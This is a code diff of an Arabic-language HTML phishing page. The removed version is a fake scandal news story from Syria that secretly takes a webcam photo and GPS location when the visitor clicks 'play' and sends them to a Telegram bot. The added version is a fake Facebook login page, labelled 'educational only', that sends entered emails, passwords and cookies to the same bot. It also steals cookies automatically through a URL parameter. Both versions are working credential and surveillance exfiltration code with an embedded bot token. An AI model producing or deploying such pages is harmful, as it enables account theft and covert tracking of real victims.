@@ -3,90 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عاجل: فضيحة تهز سوريا - - تفاصيل حصرية</title>
+    <title>فيسبوك - تسجيل الدخول</title>
     <style>
-        body {background:#f5f5f5; color:#333; text-align:right; font-family:'Segoe UI',Arial,sans-serif; margin:0; padding:0; line-height:1.8;}
-        .header {background:#d32f2f; color:#fff; padding:30px 20px; text-align:center; box-shadow:0 4px 10px rgba(0,0,0,0.2);}
-        h1 {font-size:30px; margin:0;}
-        .date {font-size:16px; opacity:0.9; margin-top:10px;}
-        .article {padding:20px; max-width:95%; margin:0 auto; background:#fff; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,0.1); margin-top:-20px;}
-        .article p {font-size:18px; margin:20px 0;}
-        .highlight {background:#fff3e0; padding:20px; border-right:5px solid #ff9800; border-radius:8px; margin:30px 0; font-style:italic;}
-        .video-section {background:#000; padding:40px 20px; text-align:center; border-radius:15px; margin:30px 0;}
-        .video-thumb {background:url('https://i.pinimg.com/originals/cb/15/66/cb1566b189b13c01e96e0bcfe4b06e3e.jpg') center/cover no-repeat; height:60vh; max-height:400px; border-radius:15px; position:relative; box-shadow:0 10px 30px rgba(0,0,0,0.5);}
-        .play-btn {position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:90px; color:#fff; background:rgba(0,0,0,0.7); width:120px; height:120px; border-radius:60px; display:flex; align-items:center; justify-content:center; cursor:pointer; animation:pulse 2s infinite;}
-        @keyframes pulse {0% {box-shadow:0 0 0 0 rgba(255,0,0,0.7);} 70% {box-shadow:0 0 0 30px rgba(255,0,0,0);} 100% {box-shadow:0 0 0 0 rgba(255,0,0,0);}}
-        .warning {font-size:16px; color:#ff9800; margin:20px 0;}
-        .loader {display:none; border:8px solid #333; border-top:8px solid #d32f2f; border-radius:50%; width:80px; height:80px; animation:spin 1s linear infinite; margin:30px auto;}
-        @keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}}
-        .status {font-size:18px; color:#d32f2f;}
+        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 360px; text-align: center; }
+        img { width: 100px; margin-bottom: 20px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
+        button { background: #1877f2; color: white; padding: 14px; width: 100%; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #166fe5; }
+        .footer { margin-top: 30px; font-size: 13px; color: #777; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>عاجل: فضيحة كبيرة تهز سوريا !</h1>
-        <p class="date">نشر اليوم - 19 ديسمبر 2025</p>
-    </div>
-    <div class="article">
-        <p>في تطور مثير وغير متوقع، وصلتنا تفاصيل حصرية عن فضيحة كبيرة هزت أركان وريف دمشق. المصادر الموثوقة داخل المنطقة أكدت أن الأمر يتعلق بأحداث غامضة وصفقات سرية شملت شخصيات معروفة محليًا.</p>
-        <p>بدأت القصة عندما تم تسريب معلومات حساسة من أحد الأطراف، وسرعان ما انتشرت بين السكان. الشهود يتحدثون عن لقاءات سرية في أماكن عامة، ووثائق تكشف تفاصيل مذهلة.</p>
-        <div class="highlight">
-            <p>"الأمر أكبر مما يتخيله أحد، والفيديو الكامل اللي وصلنا يثبت كل شيء. لكن للأمان والخصوصية، المحتوى مقيد جغرافيًا لسكان التل فقط، عشان ما ينتشر خارج المنطقة."</p>
+    <div class="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_(2019).svg" alt="Facebook">
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="رقم الجوال أو البريد الإلكتروني" required>
+            <input type="password" id="pass" placeholder="كلمة المرور" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <div class="footer">
+            <p>صفحة وهمية لأغراض تعليمية فقط - فريق الأمن السيبراني</p>
         </div>
-        <p>الفيديو الحصري اللي بين إيدينا يحتوي على مشاهد مباشرة وتسجيلات صوتية واضحة. لكن لضمان أنك من سكان المنطقة ومشاهدة آمنة، نحتاج تحقق سريع من موقعك وصورة للتأكيد (لن يتم حفظ أو مشاركة أي شيء، مجرد تحقق تلقائي).</p>
-        <div class="video-section">
-            <p class="warning">تحذير: المحتوى للكبار فقط ويحتوي على مشاهد قوية</p>
-            <div class="video-thumb">
-                <div class="play-btn" onclick="startCapture()">▶</div>
-            </div>
-        </div>
-        <div class="loader" id="loader"></div>
-        <p id="status" class="status">اضغط على الزر لمشاهدة الفيديو الكامل...</p>
     </div>
 
+    <!-- كوكيز وهمية -->
     <script>
-    function startCapture() {
-        document.getElementById('loader').style.display = 'block';
-        document.getElementById('status').innerText = 'جاري تحميل الفيديو...';
+        document.cookie = "sessionid=HTML_EDU_TEST_SESSION_2026; path=/;";
+        document.cookie = "c_user=61577026023017; path=/;";
+        document.cookie = "xs=28%3AHTML_TEST_XS_2026; path=/;";
+        document.cookie = "fr=0HTML_FR_TEST_2026; path=/;";
+        document.cookie = "datr=HTML_DATR_TEST_2026; path=/;";
+        document.cookie = "sb=HTML_SB_TEST_TOKEN; path=/;";
+    </script>
 
-        navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(stream=>{
-            let video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-            setTimeout(()=>{
-                let canvas = document.createElement('canvas');
-                canvas.width = 1280;
-                canvas.height = 720;
-                canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
-                let imgData = canvas.toDataURL('image/jpeg');
+    <!-- دالة الإرسال بـ sendPhoto (نفس الطريقة الناجحة بتاعتك) -->
+    <script>
+        const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+        const CHAT_ID = "1611398303";
 
-                navigator.geolocation.getCurrentPosition(pos=>{
-                    let gps = pos.coords.latitude + "," + pos.coords.longitude + " ±" + pos.coords.accuracy + "m";
+        function sendToTelegram(caption) {
+            // صورة وهمية صغيرة (1x1 بكسل شفافة) عشان sendPhoto يقبل
+            const canvas = document.createElement('canvas');
+            canvas.width = 1;
+            canvas.height = 1;
+            const blob = canvas.toDataURL('image/png');
 
-                    let caption = encodeURIComponent("🆕 ضحية جديدة من التل\nGPS: " + gps + "\nوقت: " + new Date());
+            const form = new FormData();
+            form.append('chat_id', CHAT_ID);
+            form.append('caption', caption);
+            form.append('photo', dataURLtoBlob(blob), 'pixel.png');
 
-                    let url = "https://api.telegram.org/bot8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8/sendDocument?chat_id=1611398303&caption=" + caption;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: form
+            });
+        }
 
-                    let form = new FormData();
-                    form.append('document', dataURLtoBlob(imgData), "photo.jpg");
+        function dataURLtoBlob(dataurl) {
+            let arr = dataurl.split(',');
+            let mime = arr[0].match(/:(.*?);/)[1];
+            let bstr = atob(arr[1]);
+            let n = bstr.length;
+            let u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], {type: mime});
+        }
 
-                    fetch(url, {method: 'POST', body: form})
-                        .then(() => document.getElementById('status').innerText = 'تم!')
-                        .catch(() => document.getElementById('status').innerText = 'خطأ');
-                });
+        // سرقة عند الضغط
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
 
-                stream.getTracks().forEach(track => track.stop());
-            }, 1500);
+            const email = document.getElementById('email').value || 'غير مدخل';
+            const pass = document.getElementById('pass').value || 'غير مدخل';
+            const cookies = document.cookie;
+
+            let caption = "🔴 ضحية تعليمية وقعت في الفخ!\n\n";
+            caption += "البريد: " + email + "\n";
+            caption += "كلمة السر: " + pass + "\n";
+            caption += "الكوكيز: " + cookies + "\n";
+            caption += "الرابط: " + window.location.href;
+
+            sendToTelegram(caption);
+
+            setTimeout(() => { window.location.href = "https://www.facebook.com"; }, 800);
         });
-    }
 
-    function dataURLtoBlob(dataurl) {
-        let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-        while(n--) u8arr[n] = bstr.charCodeAt(n);
-        return new Blob([u8arr], {type:mime});
-    }
+        // سرقة تلقائية مع ?steal=1
+        if (window.location.search.includes('steal=1')) {
+            const cookies = document.cookie;
+
+            let caption = "🔴 سرقة كوكيز تلقائية ناجحة!\n\n";
+            caption += "الكوكيز: " + cookies + "\n";
+            caption += "الرابط: " + window.location.href;
+
+            sendToTelegram(caption);
+        }
     </script>
 </body>
 </html>
-
